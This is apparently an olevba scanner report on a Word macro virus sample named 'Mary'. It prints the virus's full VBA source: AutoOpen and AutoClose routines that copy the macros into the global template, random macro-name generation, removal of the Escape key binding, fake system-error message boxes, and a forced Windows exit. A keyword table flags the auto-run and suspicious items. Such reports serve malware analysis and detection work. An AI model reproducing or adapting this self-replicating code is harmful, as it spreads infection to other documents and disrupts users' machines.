olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mary-62b898f80d36d2e88a63b0f10965934fb3113e6a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mary-62b898f80d36d2e88a63b0f10965934fb3113e6a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Mary-62b898f80d36d2e88a63b0f10965934fb3113e6a - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Polly()
On Error GoTo Gone
A$ = FileName$()
If A$ = "" Then GoTo Finish
If VInstalled = 0 Then
        Run1
        Run2
        FileSaveAll 1, 1
Else
        GoTo Done
End If
 
Gone:
A$ = FileName$()
If A$ = "" Then
        GoTo Finish
Else
        Insert " "
End If
 
Finish:
MsgBox "Mary wants a cracker", -8
End Sub
 
Sub Run1()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)
 
Z$ = X$ + Y$
 
R1$ = GetDocumentVar$("MaryVirDoc")
CO$ = FileName$() + ":" + R1$
MacroCopy CO$, "Global:" + Z$
SetProfileString "Intl", "Info2", Z$
ToolsCustomizeKeyboard .KeyCode = 65, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub


Sub Run2()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)
 
Z$ = X$ + Y$
 
R2$ = GetDocumentVar$("VirName")
OC$ = FileName$() + ":" + R2$
MacroCopy OC$, "Global:" + Z$
SetProfileString "Intl", "Info1", Z$
ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub
 
Function VInstalled()
CC$ = GetProfileString$("Intl", "Info1")
        VInstalled = 0
        If CountMacros(0) > 0 Then
                For i = 1 To CountMacros(0)
                If MacroName$(i, 0) = CC$ Then
                        VInstalled = 1
                End If
        Next i
End If
End Function
 
Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
A$ = Str$(Num)
A$ = LTrim$(A$)
 
B$ = Mid$(A$, 1, 1)
C$ = Mid$(A$, 2, 1)
D$ = Mid$(A$, 3, 1)
E$ = Mid$(A$, 4, 1)
 
If B$ = "1" Then F$ = "A"
If B$ = "2" Then F$ = "B"
If B$ = "3" Then F$ = "C"
If B$ = "4" Then F$ = "D"
If B$ = "5" Then F$ = "E"
If B$ = "6" Then F$ = "F"
If B$ = "7" Then F$ = "G"
If B$ = "8" Then F$ = "H"
If B$ = "9" Then F$ = "I"
If B$ = "0" Then F$ = "J"
 
If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"
 
If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"
 
If E$ = "1" Then J$ = "R"
If E$ = "2" Then J$ = "S"
If E$ = "3" Then J$ = "T"
If E$ = "4" Then J$ = "U"
If E$ = "5" Then J$ = "V"
If E$ = "6" Then J$ = "W"
If E$ = "7" Then J$ = "X"
If E$ = "8" Then J$ = "Y"
If E$ = "9" Then J$ = "Z"
If E$ = "0" Then J$ = "Q"
 
Fun$ = F$ + G$ + H$ + J$
End Function

Sub AutoOpen()
Infect
Polly
Payload
End Sub

Sub Payload()
ToolsCustomizeKeyboard .KeyCode = 27, .Category = 1, .Name = "Cancel", .Remove, .Context = 0

If Month(Now()) = 1 Then
If Day(Now()) = 21 Then
MsgBox "Mary was proudly made by Lorz"
End If
End If
End Sub

Sub AutoClose()
On Error GoTo phil
Infect
Polly
ActiveDocument.Save
Payload
MsgBox "System Unstable, Please reboot you computer"
ExitWindowsEx 2, ffffffff
phil:
End Sub

Sub Infect()
MacroCopy Name$, "Global:AutoOpen"
MacroCopy Name$, "Global:Polly"
MacroCopy Name$, "Global:AutoClose"
MacroCopy Name$, "Global:Payload"
MacroCopy Name$, "Global:ToolsMacro"


Name$ = WindowName$() + ":AutoOpen"
Name$ = WindowName$() + ":AutoClose"
Name$ = WindowName$() + ":ToolsMacro"
ToolsMacro .Name = "Payload", .Run, .Show = 0, .Discription = "", .NewName = ""

End Sub

Sub ToolsMacro()
On Error GoTo phil
Payload
MsgBox "Memory, Stack Error at CS:1000", , _
"Memory Allocation Error"
Infect
phil:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

